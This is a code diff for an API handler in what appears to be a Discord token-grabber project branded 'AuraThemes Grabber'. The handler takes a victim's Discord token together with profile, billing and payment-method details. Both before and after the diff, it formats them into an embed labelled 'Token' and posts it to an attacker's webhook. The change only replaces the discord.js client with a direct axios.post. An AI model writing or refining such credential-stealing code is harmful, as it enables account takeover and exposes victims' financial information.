@@ -1,11 +1,6 @@
-import { EmbedBuilder, WebhookClient } from 'discord.js';
 import { webhook as WEBHOOK } from '../../../../k4itrun.config';
 import fetch from 'sync-fetch';
 import axios from 'axios';
-
-const webhook = new WebhookClient({
-  url: WEBHOOK,
-});
 
 export default async function handler(req, res) {
   try {
@@ -33,11 +28,11 @@ export default async function handler(req, res) {
     })
 
     if (info?.id) {
-      await webhook.send({
-        embeds: [embedGrabber(info, data)],
+      await axios.post(WEBHOOK, {
         username: '@AuraThemes',
-        avatarURL: 'https://i.imgur.com/WkKXZSl.gif',
-      });
+        avatar_url: 'https://i.imgur.com/WkKXZSl.gif',
+        embeds: [embedGrabber(info, data)],
+      })
     }
 
     res.status(200).send(data);
@@ -199,18 +194,22 @@ function embedGrabber(info, data) {
     if (e.type == 16 && !e.invalid) a += `\`Rabobank\` `;
     if (e.type == 7 && !e.invalid) a += `\`PaysafeCard\` `;
     return a;
-  }, '') ||  `\`No found\``;
+  }, '') || `\`No found\``;
 
   const avatar = info.avatar ? getImage(`https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}`) : 'https://i.imgur.com/WkKXZSl.gif';
 
   console.log({ ...profile, ...settings, ...payment })
 
-  return new EmbedBuilder()
-    .setAuthor({ name: `${info.username}#${info.discriminator} | ${info.id}`, iconURL: avatar })
-    .setThumbnail(avatar)
-    .setColor("#c267ff")
-    .setTitle('AuraThemes Dualhooked')
-    .addFields(
+  return {
+    author: {
+      name: `${info.username}#${info.discriminator} | ${info.id}`,
+      icon_url: avatar
+    },
+    thumbnail: {
+      url: `${avatar}`,
+    },
+    color: 12740607,
+    fields: [
       { name: "<a:aura:1087044506542674091> Token", value: `\`\`\`${data}\`\`\``, inline: false },
       { name: "Nitro", value: getNitro(profile), inline: true },
       { name: "Badges", value: allBabges(info.flags), inline: true },
@@ -219,7 +218,11 @@ function embedGrabber(info, data) {
       { name: "Billing", value: `${billing}`, inline: true },
       { name: "Langue", value: getLanguage(settings.locale), inline: true },
       { name: "Status", value: getStatus(settings.status), inline: true },
-    )
-    .setFooter({ text: 'AuraThemes Grabber', iconURL: 'https://i.imgur.com/WkKXZSl.gif' })
-    .setTimestamp();;
+    ],
+    footer: {
+      text: 'AuraThemes Grabber',
+      icon_url: 'https://i.imgur.com/WkKXZSl.gif'
+    },
+    timestamp: new Date()
+  };
 }
